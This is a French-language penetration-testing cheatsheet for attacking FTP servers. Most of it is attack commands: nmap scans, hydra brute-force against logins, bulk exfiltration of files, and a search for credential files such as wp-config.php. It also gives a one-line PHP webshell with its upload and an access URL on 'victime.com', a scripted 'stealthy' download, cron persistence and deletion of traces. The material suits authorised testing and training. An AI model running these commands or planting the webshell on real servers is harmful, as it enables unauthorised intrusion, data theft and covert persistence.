# 📁 FTP - Cheatsheet Cybersécurité

Ce fichier regroupe les commandes essentielles pour **scanner**, **brute-forcer**, **exploiter**, et **maintenir un accès** sur un serveur FTP.

---

## 🔍 1. Détection & Scan

```
nmap -p 21 -sV <IP>  
```
> Détecte si le port FTP (21) est ouvert et identifie le service

```
nmap -p 21 --script ftp-anon <IP>  
```
> Teste l’accès anonyme sur le serveur FTP

```
nmap --script ftp-bounce -p 21 <IP>  
```
> Vérifie si le serveur est vulnérable au FTP bounce attack

---

## 🔑 2. Accès anonyme & bruteforce

```
ftp <IP>  
```
> Connexion manuelle (test anonyme avec login `anonymous` et mot de passe vide ou email)

```
hydra -l ftp -P wordlist.txt ftp://<IP>  
```
> Bruteforce d’un utilisateur connu (`ftp`)

```
hydra -L users.txt -P pass.txt ftp://<IP>  
```
> Bruteforce multi-utilisateurs

---

## 🗂 3. Navigation & Exfiltration

```
ftp <IP>  
```
> Connexion FTP en mode interactif

```
ls / dir  
```
> Liste les fichiers et répertoires

```
cd <dossier>  
```
> Changer de dossier

```
get <fichier>  
```
> Télécharger un fichier depuis le serveur

```
put <fichier>  
```
> Envoyer un fichier (si permissions autorisées)

```
mget *  
```
> Télécharger tous les fichiers du dossier

---

## 🧠 4. Analyse de fichiers sensibles

```
- `.htpasswd` / `.htaccess`  
```
> Fichiers contenant des hashes de mots de passe

```
- `backup.sql`, `db.dump`, `.bak`, `.zip`  
```
> Dumps ou archives sensibles à explorer

```
- `config.php`, `wp-config.php`  
```
> Contient souvent des credentials MySQL

```
strings fichier.zip  
```
> Analyse rapide du contenu s’il est lisible

---

## 💣 5. Upload de payload (si autorisé)

- Reverse shell PHP si webroot accessible :  

```
echo "<?php system(\$_GET['cmd']); ?>" > shell.php  
```
> Webshell simple en PHP

```
put shell.php  
```
> Upload du shell

Accès : http://victime.com/shell.php?cmd=whoami

---

## 🧬 6. Maintien d’accès

### 🐚 Script FTP en bash

```
echo -e "open <IP>\nuser hacker P@ssw0rd\nget secret.txt\nbye" > script.ftp  
ftp -n < script.ftp  
```
> Script d’automatisation pour téléchargement furtif

### 📅 Persistance

```
put cron.sh  
```
> Upload d’un script cron si accès à `/etc/cron.*`

---

## 🧹 7. Nettoyage

```
del shell.php  
```
> Supprime un shell PHP après usage

```
rm script.ftp  
```
> Supprime un script local

---

## ⚠️ 8. Vulnérabilités classiques

- FTP anonyme sans restriction  
- Accès en écriture non sécurisé  
- Vulnérabilité FTP Bounce  
- Informations sensibles non protégées  
- FTP utilisé dans un environnement non chiffré (pas de FTPS)

---

## 🛠 9. Outils utiles

- `nmap`  
> Scanner & scripts NSE FTP

- `hydra`  
> Bruteforce FTP

- `ftpmap`, `medusa`, `ncrack`  
> Alternatives pour bruteforce et test de connexions

- `metasploit`  
> Modules FTP (ex: `auxiliary/scanner/ftp/ftp_login`)

---

## 📚 10. Ressources utiles

- [PayloadsAllTheThings - FTP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Transfer%20Protocols/FTP)
- [HackTricks - FTP](https://book.hacktricks.xyz/network-services-pentesting/ftp)
